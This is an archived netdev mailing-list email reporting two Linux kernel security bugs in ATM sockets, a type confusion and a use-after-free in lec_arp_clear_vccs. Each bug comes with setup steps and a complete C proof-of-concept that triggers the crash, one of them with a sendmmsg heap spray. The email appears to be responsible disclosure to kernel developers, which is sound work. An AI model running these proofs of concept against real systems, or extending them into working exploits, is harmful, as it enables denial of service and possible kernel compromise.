Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 51D811BA461
	for <lists+netdev@lfdr.de>; Mon, 27 Apr 2020 15:15:46 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1727115AbgD0NPn (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Mon, 27 Apr 2020 09:15:43 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50862 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-FAIL-OK-FAIL)
        by vger.kernel.org with ESMTP id S1726651AbgD0NPn (ORCPT
        <rfc822;netdev@vger.kernel.org>); Mon, 27 Apr 2020 09:15:43 -0400
Received: from mail-lj1-x230.google.com (mail-lj1-x230.google.com [IPv6:2a00:1450:4864:20::230])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 3DD40C0610D5
        for <netdev@vger.kernel.org>; Mon, 27 Apr 2020 06:15:43 -0700 (PDT)
Received: by mail-lj1-x230.google.com with SMTP id a21so14626581ljj.11
        for <netdev@vger.kernel.org>; Mon, 27 Apr 2020 06:15:43 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=Fnbb10p6haOueOHhUxWs+o9mlpt1dqSAGFhXz3/TdwA=;
        b=l9XrC0Cpqpg3v3lMdykO2vEzb2q7vHvmuQbsfdJJchF7pSLCWajHWdWjgPRWKd/Qfg
         4F6Iu/E3X0igmwcTv83D5rzOPuhM9urxvEU53tJPEguQVot5E73KA0IJKQAetvAHGByG
         rtCl4ScUP9GR5VsEgnCVhz3zvMNqIZROBFTbSZRqhWQ6LVv4t+7SpOM9yE2fcw8JKA4/
         6S/WQRwbEF7i1sYeGtxVIIURrbb5UI6XCbqRe97soOyEgmaTi83oAYl+XK6yfQHGIstw
         4nsUhbgesDJARcbPPLlwE96v1kY7GTpDzs44xCIt5ieCfg3pmxJYut5GybksC1DNqWaN
         8ToA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=Fnbb10p6haOueOHhUxWs+o9mlpt1dqSAGFhXz3/TdwA=;
        b=hR9WMTbb1dduYXkYMGo0pbi9ZJD3qXAq+140aKHCj30XJ7uTxYG0FigH9M9l4vLp+b
         IFokdLTPpYN1lNzS4vBFkBKTlCNU9fZL9cs+JPNasNOG47+8vk7e5C6HupToSfxBajMV
         Aek8F74Fz/toVFm+YCFakYeVic2F0g/YO5MTZ3RBc9wqseih25xiFaiEJQW+h+WHt6z9
         Zu5Pl6gdpqwzHdogri0DzcKCssGkrXsEUz732Zd39Bf18bF6kVLqfPG9tIwrVY1Ro3QR
         0vJv45XqKRZxphEmm2YwZ35uk8Gldecj0pKqdzPZ31FQWVHqC6Tu/OlrxJACcubJxHiZ
         ZBOA==
X-Gm-Message-State: AGi0PuaSox9tZ30qbmFAGmQ++g3rTUnP6BUT4YSzXT1UFqZ+fk1icUJr
        gGzrT6EWXtTtcagBA3ZOvAvIDYHWaeaDFFZJYJpI6acY
X-Google-Smtp-Source: APiQypJ11vVdc0YRegS5jTFVFB+DMhwJoEm6+WaJKFcu2mHduSbFq/v4qxPU9jlpuQqqhA738dIqFI6DJmo7brnplPo=
X-Received: by 2002:a2e:9c13:: with SMTP id s19mr13504971lji.5.1587993340624;
 Mon, 27 Apr 2020 06:15:40 -0700 (PDT)
MIME-Version: 1.0
From:   Gengming Liu <l.dmxcsnsbh@gmail.com>
Date:   Mon, 27 Apr 2020 21:15:29 +0800
Message-ID: <CAEn12o7mwN3CT_=kv7NHho7fz-E8jeJfM99ZWD4JVL2E_wm-6g@mail.gmail.com>
Subject: Two bugs report
To:     netdev@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

We found two security bugs in the linux kernel and here's the
description of the bugs.

0.Build a testing environment
  a. Set up Ubuntu 19.04 in Vmware workstation.
  b. sudo apt install linux-image-5.0.0-21-generic.
  c. Change the grub default boot entry to 5.0.0-21-generic. (see
https://askubuntu.com/questions/100232/how-do-i-change-the-grub-boot-order)
cat /proc/version. If it is as following, it means you succeed.

"Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
2019"

  d. compile the poc by using gcc.
  e. Excute poc by "sudo ./poc"
  f. Use dmesg to check kernel message about crash.

1.atm_vcc_userback type confusion

atm(AF_ATMSVC) socket's vcc->user_back can be treated as different
types of structures.

To trigger this bug it requires CAP_NET_ADMIN.(Use sudo ./poc)

The PoC has been tested on Linux 5.0.0-21 with Vmware workstation.
Proc version is:
Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
2019

Poc:
#include <linux/socket.h>
#include <linux/atmdev.h>
#include <linux/atmarp.h>
#include <linux/atmlec.h>
#include <linux/atmsvc.h>
#include <linux/atmmpc.h>
#include <linux/atmclip.h>

int main(int argc, char const *argv[])
{
int fd;
fd = socket(0x14,3,0);
ioctl(fd,0x61d8, 0x17); //ATMMPC_CTRL

unsigned long long arg = 1;
ioctl(fd, 0x400261f2, &arg ); //ATM_SETBACKEND
ioctl(fd, 0x61e2, 1 ); //ATMARP_MKIP

char buffer[] =
"\x21\x26\x27\xc2\xdd\x6e\x1c\x96\x6e\x6b\x1e\xbb\x04\x4f\x0e\x3a\x51\x07\x22\xec\x86\x57";
setsockopt(fd,0xe0c7, 0x80, buffer,0x16);

return 0;
}

2.use-after-free in lec_arp_clear_vccs.

UAF object: struct atm_vcc *vcc

vcc is a atm(AF_ATMSVC) socket.

To trigger this bug:

1. Create vcc socket #A and #B
2. ioctl(ATMLEC_CTRL) to attach #A to lec device.
3. ioctl(ATMLEC_DATA) to attach #B to device's priv->lec_arp_empty_ones list
4. close socket #B
5. close vcc socket #A to call lec_arp_clear_vccs() to trigger UAF

To trigger this bug it requires CAP_NET_ADMIN. (Use sudo ./poc)

The PoC has been tested on Linux 5.0.0-21 with Vmware workstation.
Proc version is:
Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
2019

Poc:
#include <linux/socket.h>
#include <linux/atmdev.h>
#include <linux/atmarp.h>
#include <linux/atmlec.h>
#include <linux/atmsvc.h>
#include <linux/atmmpc.h>
#include <linux/atmclip.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include <sys/uio.h>
#include <signal.h>
 #include <sys/mman.h>
#include <sys/prctl.h>

#include <sys/inotify.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>

//#include <linux/wireless.h>
#include <sys/types.h> /* See NOTES */
#include <sys/socket.h>
#include <linux/socket.h>
#include <sys/un.h>
#include <stdbool.h>
#include <netinet/in.h>
#define SOCK_PORT 10000
struct my_mmsghdr
{
struct msghdr msg_hdr; /* Message header */
unsigned int msg_len;  /* Number of bytes transmitted */
};

void *sendmmsg_client_func()
{
int sockfd2;
struct sockaddr_in *paddr;
char szbuff[2050];
int ret;

struct sockaddr_in local_addr;
local_addr.sin_port = htons(SOCK_PORT /*+ getpid()*/);
local_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
local_addr.sin_family = AF_INET;

memset(szbuff, 0x2b, 2048);

sockfd2 = socket(AF_INET, SOCK_DGRAM, 0);
paddr = &local_addr;

while (0 < connect(sockfd2, paddr, sizeof(*paddr)))
{
perror("connect");
usleep(11);
}

struct msghdr msg;
struct my_mmsghdr mmsg;

struct iovec vec;

vec.iov_base = szbuff;
vec.iov_len = 1;

msg.msg_name = paddr;
msg.msg_namelen = sizeof(*paddr);
msg.msg_iov = &vec;
msg.msg_iovlen = 1;
msg.msg_control = szbuff;
msg.msg_controllen = 2048;
msg.msg_flags = 0;

mmsg.msg_hdr = msg;
mmsg.msg_len = 1;


ret = syscall(__NR_sendmmsg, sockfd2, &mmsg, 1, 0);
if (ret < 0)
{
perror("sendmmsg");
}

}
void force_loop(){
/* code */
int sockB,sockA;
int dev = 3;
struct atmlec_ioc ioc_data;


sockB = socket(0x14, 0x2, 0x0);


sockA = socket(0x14, 0x2, 0x0);

ioctl(sockA, ATMLEC_CTRL, dev);

ioc_data.dev_num = dev;
ioc_data.receive = 1;
ioctl(sockB, ATMLEC_DATA, &ioc_data);

close(sockB);
sendmmsg_client_func();

   close(sockA);

}


int main(int argc, char const *argv[])
{
force_loop();


return 0;
}
